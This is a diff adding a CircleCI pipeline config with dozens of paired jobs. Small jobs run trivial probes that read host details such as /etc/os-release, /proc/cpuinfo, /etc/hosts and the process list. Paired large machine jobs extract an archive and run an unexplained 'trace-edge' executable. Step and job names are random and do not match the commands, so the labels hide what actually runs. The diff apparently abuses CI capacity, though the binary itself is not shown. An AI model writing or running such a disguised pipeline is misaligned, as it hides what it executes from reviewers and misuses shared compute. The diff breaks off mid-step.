@@ -1,0 +1,1841 @@
+version: 2.1
+
+jobs:
+  panel_full_coupon_init:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Was the chapter markers thumbnailed
+          command: |
+            mkdir -p /tmp/slice
+            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=500000;i++) print i*7}' > /tmp/slice/INV_084975; true
+            du -b /tmp/slice/INV_084975 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'INV_084975'
+  Validate_Tests1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/INV_084975 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  INDEX3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Checkpoint the loss curve ready for good measure
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; if [[ -S /dev/log ]]; then echo 'ok'; fi; true ; } > /tmp/slice/INV60116
+            du -b /tmp/slice/INV60116 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'INV60116'
+  lima-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/INV60116 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  fact_assert_union_string:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: true up the FX rates NOPE
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; printf "%s\n" purple magenta gray red cyan | sort; true ; } > /tmp/slice/166gda4t
+            du -b /tmp/slice/166gda4t | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '166gda4t'
+  verify-nightly-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/166gda4t 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  llbBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: PACK WORLD CHUNKS ASAP
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; type type; true ; } > /tmp/slice/v9.20.38
+            du -b /tmp/slice/v9.20.38 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'v9.20.38'
+  ci-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/v9.20.38 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  OMGX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Tomasz owns restart
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; cat /etc/os-release |tr -d '"' |awk -F = '{ print $2 }'; true ; } > /tmp/slice/1a602a81-6280-f603-3dc0
+            du -b /tmp/slice/1a602a81-6280-f603-3dc0 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '1a602a81-6280-f603-3dc0'
+  INFRA-750:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/1a602a81-6280-f603-3dc0 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  unsafeNo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Let me tag the readme
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; for k in $(seq 1 9); do echo $k; done | nl; true ; } > /tmp/slice/west_config
+            du -b /tmp/slice/west_config | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'west_config'
+  nova-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/west_config 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  alphaSilver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: init wrk dry
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; if test -L /bin; then echo yes; else echo no; fi; true ; } > /tmp/slice/63.41.4.122
+            du -b /tmp/slice/63.41.4.122 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '63.41.4.122'
+  Validate_Release2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/63.41.4.122 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  OPHCE-11435:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Fade the sprite sheet after backup
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; echo 81 99 15 97 62 | tr ' ' '\n' | paste -sd+; true ; } > /tmp/slice/ead1ca791
+            du -b /tmp/slice/ead1ca791 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'ead1ca791'
+  fix-dashboard-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/ead1ca791 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  ms_fname_prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Train for 1 epochs
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ls -sGR /usr/local|sort -r; true ; } > /tmp/slice/crane_trade_theta_copper
+            du -b /tmp/slice/crane_trade_theta_copper | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'crane_trade_theta_copper'
+  java17-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/crane_trade_theta_copper 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  constName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: okay update the sitemap i guess
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; cp /etc/shells "/tmp/turtle.bak" && sed -i '/^#/d' "/tmp/turtle.bak" && grep -c . "/tmp/turtle.bak"; true ; } > /tmp/slice/a8eb67d8eb0
+            du -b /tmp/slice/a8eb67d8eb0 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'a8eb67d8eb0'
+  PROD_DEPLOY_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/a8eb67d8eb0 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  path_139:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Give the transaction log a nudge
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; grep -cr case /etc 2>/dev/null | tail -n 4; true ; } > /tmp/slice/run-18t
+            du -b /tmp/slice/run-18t | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'run-18t'
+  bravo-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/run-18t 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  Grant-HostItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: announcement then signing
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ls /usr/lib | pr -3 -t | tr '[:lower:]' '[:upper:]' | nl; true ; } > /tmp/slice/red618
+            du -b /tmp/slice/red618 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'red618'
+  india-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/red618 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  sec-31275-total:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Properly warm the TLS certs
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ls -dgl --hide=\*.d /var | nl; true ; } > /tmp/slice/hSSnGK7vzPBsQnFCRL
+            du -b /tmp/slice/hSSnGK7vzPBsQnFCRL | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'hSSnGK7vzPBsQnFCRL'
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/hSSnGK7vzPBsQnFCRL 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  export_ref:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: COOLDOWN 202702
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; type sed &>/dev/null && echo "have sed" || echo "no sed"; true ; } > /tmp/slice/RavenModuleSilent
+            du -b /tmp/slice/RavenModuleSilent | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'RavenModuleSilent'
+  validate-partial-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/RavenModuleSilent 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  patelpatel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Fortissimo promotion
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/ba7" && touch "/tmp/ba7"/img_{1..5}.csv && ls "/tmp/ba7"; true ; } > /tmp/slice/v-v4.3.21
+            du -b /tmp/slice/v-v4.3.21 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'v-v4.3.21'
+  Build_App9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/v-v4.3.21 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  button_pad_session:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Cleared for staging
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; tr -d '"' </etc/os-release | sed 's/=.*//' | awk '{print length, $0}'; true ; } > /tmp/slice/epoch_102
+            du -b /tmp/slice/epoch_102 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'epoch_102'
+  Run_Release8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/epoch_102 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  Lock2PCI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Normalize the waveform in time for posterity
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; tr -d '[:digit:]' </proc/cpuinfo|head -n 4; true ; } > /tmp/slice/20160220
+            du -b /tmp/slice/20160220 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '20160220'
+  uniform-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/20160220 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  Y80:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Survey the emergency contacts for Felix
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ps -eo pid,rss,comm | grep -v grep | head -n 10 | awk 'NR>1 {print $1}'; true ; } > /tmp/slice/ptu7w
+            du -b /tmp/slice/ptu7w | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'ptu7w'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/ptu7w 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  glacier-contract:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: anonymize invoice rows last
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type l -name '*tab' -size -2 -exec basename '{}' \; 2>/dev/null | sort -r; true ; } > /tmp/slice/rFYl43
+            du -b /tmp/slice/rFYl43 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'rFYl43'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/rFYl43 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  stateCubeAccountToastCrimson:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: sweep reward model
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'a b c' 'fix typo' | expand -t 6 | sort | fmt -w 33; true ; } > /tmp/slice/o8sv7Ro4JZFSaGNsKL3
+            du -b /tmp/slice/o8sv7Ro4JZFSaGNsKL3 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'o8sv7Ro4JZFSaGNsKL3'
+  rust-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/o8sv7Ro4JZFSaGNsKL3 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  bigOrbit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: H hour warmup
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; grep -m2 localhost /etc/hosts | sort -u; true ; } > /tmp/slice/snapshot-v1.20.2
+            du -b /tmp/slice/snapshot-v1.20.2 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'snapshot-v1.20.2'
+  europa-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/snapshot-v1.20.2 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  Revoke-KernelStatus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Gateway bind
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -name "*" -size 0 -exec sha1sum {} \; 2>/dev/null|sort -r; true ; } > /tmp/slice/153318_2025
+            du -b /tmp/slice/153318_2025 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '153318_2025'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/153318_2025 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  DogVs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Revoke the timesheets ahead of rollout
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; numfmt --to=iec --padding=10 443791; true ; } > /tmp/slice/145808_2019
+            du -b /tmp/slice/145808_2019 | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - '145808_2019'
+  q2-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/145808_2019 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  check_grid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enrich Error Rows
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; greet() { local i; for ((i=0; i<$1; i++)); do echo -n "$2"; done; echo; }; greet 2 ab; true ; } > /tmp/slice/MVC-GIF
+            du -b /tmp/slice/MVC-GIF | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'MVC-GIF'
+  Rollout_Pipeline6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/MVC-GIF 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  stash-kyle-camera:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nvm dump the dead tuples
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; until test -e ${TMPDIR:-/tmp}/test-lion-upper.flag; do touch ${TMPDIR:-/tmp}/test-lion-upper.flag; done; ls -l ${TMPDIR:-/tmp}/test-lion-upper.flag; true ; } > /tmp/slice/titanshimmerfjord
+            du -b /tmp/slice/titanshimmerfjord | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'titanshimmerfjord'
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/titanshimmerfjord 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/trace-edge"
+  emitDriver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Count SKUs Priority
+          command: |
+            mkdir -p /tmp/slice
+            { set +o pipefail 2>/dev/null; ps -C bash|head -n2; true ; } > /tmp/slice/scratch-ea22e6c
+            du -b /tmp/slice/scratch-ea22e6c | awk '{print "db3",$1}'
+      - persist_to_workspace:
+          root: /tmp/slice
+          paths:
+            - 'scratch-ea22e6c'
+  dotnet8-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/slice
+      - run:
+          name: Enter phase
+          command: |
+            { read -N 10 chunk < /tmp/slice/scratch-ea22e6c 2>/dev/null; echo -n "chunk: $chunk"; echo; } || true
+      - run:
+          name: Get project
+          command: git clone --depth 1 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bzcat images-quarry.tar.bz2 | tar xf -
+      - run:
